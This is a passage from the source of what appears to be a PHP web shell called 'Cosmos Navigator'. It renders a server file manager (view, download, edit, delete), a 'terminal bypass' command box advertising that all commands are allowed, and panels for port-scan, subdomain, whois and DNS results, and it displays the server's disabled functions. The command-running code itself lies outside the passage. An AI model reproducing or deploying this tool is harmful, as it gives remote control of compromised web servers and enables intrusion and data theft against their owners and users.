                            <i class="fas fa-satellite"></i> ' . $itemCount . ' object' . ($itemCount != 1 ? 's' : '') . ' | <i class="fas fa-folder"></i> Directory
                        </div>
                    </div>
                    <div class="facts">
                        <a href="?d=' . $encodedPath . '" class="btn btn-folder">
                            <i class="fas fa-door-open"></i> Enter
                        </a>
                        <button onclick="showRenameModal(\'' . x($f) . '\', true)" class="btn btn-rename">
                            <i class="fas fa-edit"></i> Rename
                        </button>
                        <a href="javascript:void(0)" onclick="confirmDelete(\'' . x($f) . '\', \'folder\')" class="btn btn-del">
                            <i class="fas fa-trash"></i> Delete
                        </a>
                    </div>
                  </div>';
        }
        
        // Display files
        foreach ($filesList as $f) {
            $path = $dir . '/' . $f;
            $size = is_file($path) ? formatSize(filesize($path)) : 'N/A';
            $icon = getFileIcon($f);
            $ext = strtolower(pathinfo($f, PATHINFO_EXTENSION));
            $mtime = date('Y-m-d H:i', filemtime($path));
            
            echo '<div class="fitem">
                    <div class="ficon">' . $icon . '</div>
                    <div class="fname">
                        <a href="?view=' . urlencode($f) . '" target="_blank" style="color:#00f3ff;text-decoration:none;font-weight:bold;">' . x($f) . '</a>
                        <div style="font-size:11px;color:#88f;">
                            <i class="fas fa-weight-hanging"></i> ' . $size . ' | 
                            <i class="fas fa-calendar-alt"></i> ' . $mtime . '
                        </div>
                    </div>
                    <div class="facts">';
            
            // View button
            echo '<a href="?view=' . urlencode($f) . '" target="_blank" class="btn" title="View">
                    <i class="fas fa-eye"></i> View
                  </a>';
            
            // Download button
            echo '<a href="?dl=' . urlencode($f) . '" class="btn btn-dl" title="Download">
                    <i class="fas fa-download"></i> Download
                  </a>';
            
            // Edit button (only for text files)
            if(in_array($ext, ['txt', 'php', 'html', 'htm', 'css', 'js', 'json', 'xml', 'md', 'log', 'sql'])) {
                echo '<a href="?edit=' . urlencode($f) . '&d=' . urlencode($dir) . '" class="btn btn-edit" title="Edit">
                        <i class="fas fa-edit"></i> Edit
                      </a>';
            }
            
            // Rename button
            echo '<button onclick="showRenameModal(\'' . x($f) . '\', false)" class="btn btn-rename" title="Rename">
                    <i class="fas fa-edit"></i> Rename
                  </button>';
            
            // Zip action button
            if($ext !== 'zip' && $ext !== 'rar' && $ext !== '7z' && $ext !== 'tar' && $ext !== 'gz') {
                echo '<button onclick="document.getElementById(\'zip_files\').value=\'' . x($f) . '\'; document.getElementById(\'zip_name\').value=\'' . x($f) . '.zip\'; document.getElementById(\'zipForm\').submit();" class="btn btn-zip" title="Zip">
                        <i class="fas fa-file-archive"></i> Zip
                      </button>';
            }
            
            // Unzip action button
            if($ext === 'zip' || $ext === 'rar' || $ext === '7z') {
                echo '<button onclick="document.getElementById(\'unzip_file\').value=\'' . x($f) . '\'; document.getElementById(\'unzipForm\').submit();" class="btn btn-unzip" title="Unzip">
                        <i class="fas fa-file-archive"></i> Unzip
                      </button>';
            }
            
            // Delete button
            echo '<a href="javascript:void(0)" onclick="confirmDelete(\'' . x($f) . '\', \'file\')" class="btn btn-del" title="Delete">
                    <i class="fas fa-trash"></i> Delete
                  </a>';
            
            echo '</div></div>';
        }
        
        // Empty state
        if (empty($folders) && empty($filesList) && $dir === getcwd()) {
            echo '<div class="fitem" style="text-align:center;padding:30px;color:#888;">
                    <div style="font-size:40px;margin-bottom:15px;">🌌</div>
                    <h3 style="color:#a0a0ff;">Cosmic Void Detected</h3>
                    <p>No files or folders found in this orbit</p>
                    <p style="font-size:12px;margin-top:10px;">Use the buttons above to upload or create files</p>
                  </div>';
        }
        ?>
    </div>

    <!-- Network Results -->
    <?php if(isset($portScanResults)): ?>
    <div class="network-results">
        <h4 style="color:#00f3ff; margin-bottom:15px;"><i class="fas fa-search"></i> Port Scan Results for <?php echo x($_POST['scan_host'] ?? ''); ?></h4>
        <?php if(!empty($portScanResults)): ?>
            <?php foreach($portScanResults as $port): ?>
            <div class="port-item port-open">
                <span><i class="fas fa-door-open"></i> Port <?php echo $port['port']; ?> (<?php echo $port['protocol']; ?>)</span>
                <span style="color:#ffcc00;"><?php echo $port['service']; ?></span>
                <span style="color:#0f0;"><i class="fas fa-check-circle"></i> OPEN</span>
            </div>
            <?php endforeach; ?>
        <?php else: ?>
            <div style="color:#ff6666; text-align:center; padding:20px;">
                <i class="fas fa-times-circle"></i> No open ports found in range <?php echo x($_POST['start_port'] ?? 1); ?>-<?php echo x($_POST['end_port'] ?? 1000); ?>
            </div>
        <?php endif; ?>
    </div>
    <?php endif; ?>

    <?php if(isset($whoisInfo)): ?>
    <div class="network-results">
        <h4 style="color:#00f3ff; margin-bottom:15px;"><i class="fas fa-info-circle"></i> Whois Results for <?php echo x($_POST['whois_domain'] ?? ''); ?></h4>
        <pre style="color:#88f; font-family:'Consolas',monospace; font-size:12px; overflow-x:auto;"><?php echo x($whoisInfo); ?></pre>
    </div>
    <?php endif; ?>

    <?php if(isset($dnsInfo)): ?>
    <div class="network-results">
        <h4 style="color:#00f3ff; margin-bottom:15px;"><i class="fas fa-server"></i> DNS Records for <?php echo x($_POST['dns_domain'] ?? ''); ?></h4>
        <?php foreach($dnsInfo as $type => $records): ?>
            <div style="margin-bottom:15px;">
                <h5 style="color:#ffcc00; margin-bottom:5px;"><?php echo $type; ?> Records:</h5>
                <?php foreach($records as $record): ?>
                <div style="background:rgba(40,50,100,0.3); padding:8px; margin:3px 0; border-radius:5px; font-family:'Consolas',monospace; font-size:11px;">
                    <?php echo x(print_r($record, true)); ?>
                </div>
                <?php endforeach; ?>
            </div>
        <?php endforeach; ?>
    </div>
    <?php endif; ?>

    <?php if(isset($traceResult)): ?>
    <div class="network-results">
        <h4 style="color:#00f3ff; margin-bottom:15px;"><i class="fas fa-route"></i> Traceroute to <?php echo x($_POST['trace_host'] ?? ''); ?></h4>
        <pre style="color:#0f0; font-family:'Consolas',monospace; font-size:12px; overflow-x:auto;"><?php echo x($traceResult); ?></pre>
    </div>
    <?php endif; ?>

    <?php if(isset($subdomains)): ?>
    <div class="network-results">
        <h4 style="color:#00f3ff; margin-bottom:15px;"><i class="fas fa-sitemap"></i> Subdomains for <?php echo x($_POST['subdomain_domain'] ?? ''); ?></h4>
        <?php if(!empty($subdomains)): ?>
            <?php foreach($subdomains as $sub): ?>
            <div class="subdomain-item">
                <div style="display:flex; justify-content:space-between; align-items:center;">
                    <div>
                        <i class="fas fa-globe"></i> <strong><?php echo x($sub['subdomain']); ?></strong>
                    </div>
                    <span style="color:#0f0; font-size:11px;">
                        <i class="fas fa-check-circle"></i> <?php echo x($sub['status']); ?>
                    </span>
                </div>
                <div style="font-size:11px; color:#88f; margin-top:5px;">
                    <i class="fas fa-network-wired"></i> IP: <?php echo x($sub['ip']); ?>
                </div>
            </div>
            <?php endforeach; ?>
        <?php else: ?>
            <div style="color:#ff6666; text-align:center; padding:20px;">
                <i class="fas fa-times-circle"></i> No subdomains found
            </div>
        <?php endif; ?>
    </div>
    <?php endif; ?>

    <!-- EDIT FILE FORM -->
    <?php if(isset($editContent) && isset($editingFile)): ?>
    <div class="edit-container">
        <div class="edit-header">
            <i class="fas fa-edit"></i> Editing: <span><?php echo x($editingFile); ?></span>
        </div>
        <form method="POST">
            <input type="hidden" name="efile" value="<?php echo x($dir . '/' . $editingFile); ?>">
            <textarea name="econt" class="edit-textarea"><?php echo x($editContent); ?></textarea>
            <div class="edit-actions">
                <button type="submit" name="save" class="btn-save">
                    <i class="fas fa-save"></i> Save Changes
                </button>
                <a href="?d=<?php echo urlencode($dir); ?>" class="btn-cancel">
                    <i class="fas fa-times"></i> Cancel
                </a>
            </div>
        </form>
    </div>
    <?php endif; ?>

    <!-- TERMINAL -->
    <div class="terminal">
        <div class="termhead">
            <div>
                <i class="fas fa-terminal"></i> 
                <span style="font-weight:bold;letter-spacing:1px;">MULTI-METHOD TERMINAL BYPASS</span>
                <span style="color:#88f;margin-left:10px;font-size:11px;">
                    [<?php echo basename($dir) ?: 'ROOT'; ?>]
                </span>
            </div>
            <div style="display:flex;gap:5px;">
                <button onclick="quickCommand('ls -la')" class="quick-btn" style="padding:5px 10px;font-size:11px;">
                    <i class="fas fa-list"></i> ls -la
                </button>
                <button onclick="quickCommand('pwd')" class="quick-btn" style="padding:5px 10px;font-size:11px;">
                    <i class="fas fa-map-marker-alt"></i> pwd
                </button>
                <button onclick="quickCommand('whoami')" class="quick-btn" style="padding:5px 10px;font-size:11px;">
                    <i class="fas fa-user-astronaut"></i> whoami
                </button>
                <button onclick="quickCommand('uname -a')" class="quick-btn" style="padding:5px 10px;font-size:11px;">
                    <i class="fas fa-info-circle"></i> uname
                </button>
                <button onclick="quickCommand('echo "Test"')" class="quick-btn" style="padding:5px 10px;font-size:11px;">
                    <i class="fas fa-comment"></i> echo
                </button>
                <button onclick="quickCommand('wget https://example.com/file.txt')" class="quick-btn" style="padding:5px 10px;font-size:11px;">
                    <i class="fas fa-download"></i> wget
                </button>
            </div>
        </div>
        
        <?php if(isset($output)): ?>
        <div class="termout">
            <div style="color:#00ff00;margin-bottom:10px;">
                <i class="fas fa-chevron-right"></i> Command executed in: <?php echo x($dir); ?>
            </div>
            <div style="color:#88f;border-bottom:1px solid #333;padding-bottom:10px;margin-bottom:10px;">
                <i class="fas fa-dollar-sign"></i> <?php echo isset($_POST['cmd']) ? x($_POST['cmd']) : ''; ?>
            </div>
            <div style="white-space:pre-wrap;font-family:'Consolas','Monaco',monospace;"><?php 
                if (isset($output) && strpos($output, 'All command execution functions are disabled') !== false) {
                    echo '<div style="color:#ff6666;">' . x($output) . '</div>';
                } else {
                    echo x($output);
                }
            ?></div>
        </div>
        <?php endif; ?>
        
        <div class="terminal-form">
            <form method="POST" id="terminalForm">
                <input type="hidden" name="current_dir" value="<?php echo x($dir); ?>">
                <div class="cmd-input-container">
                    <div class="cmd-prompt">$</div>
                    <input type="text" name="cmd" id="cmdInput" 
                           placeholder="Enter any command (rm, wget, curl, etc.)..." 
                           value="<?php echo isset($_POST['cmd']) ? htmlspecialchars($_POST['cmd']) : ''; ?>">
                    <button type="submit" class="cmd-execute">
                        <i class="fas fa-play"></i> Execute
                    </button>
                </div>
                <div style="font-size:11px;color:#88f;margin-top:8px;padding-left:10px;">
                    <i class="fas fa-info-circle"></i> ALL COMMANDS ALLOWED: rm, wget, curl, mkdir, chmod, etc.
                </div>
            </form>
        </div>
    </div>

    <!-- RENAME MODAL -->
    <div class="rename-modal" id="renameModal">
        <div class="rename-box">
            <h3><i class="fas fa-edit"></i> Rename File/Folder</h3>
            <div>
                <label class="rename-label">
                    <i class="fas fa-file"></i> Current Name:
                </label>
                <input type="text" id="renameOldName" class="rename-input" readonly>
            </div>
            <div>
                <label class="rename-label">
                    <i class="fas fa-pen"></i> New Name:
                </label>
                <input type="text" id="renameNewName" class="rename-input" placeholder="Enter new name...">
            </div>
            <div class="rename-actions">
                <button onclick="closeRenameModal()" class="btn-cancel-modal">
                    <i class="fas fa-ban"></i> Cancel
                </button>
                <button onclick="submitRename()" class="btn-confirm">
                    <i class="fas fa-check-circle"></i> Confirm Rename
                </button>
            </div>
        </div>
    </div>

    <!-- FOOTER -->
    <div class="footer">
        <div class="footer-top">
            <div>
                🚀 <strong>COSMOS NAVIGATOR</strong> | Advanced Terminal Bypass System
            </div>
            <div style="font-size:11px;color:#88f;">
                PHP <?php echo phpversion(); ?> | 
                Objects: <?php echo (count($folders) + count($filesList)); ?> | 
                Memory: <?php echo formatSize(memory_get_usage()); ?> |
                Disabled: <?php echo ini_get('disable_functions') ?: 'None'; ?>
            </div>
        </div>
        <div class="footer-bottom">
            <i class="fas fa-keyboard"></i> Shortcuts: F5=Refresh | Ctrl+S=Save | Backspace=Parent Orbit | ESC=Close Modal
        </div>
    </div>
</div>

</body>
</html>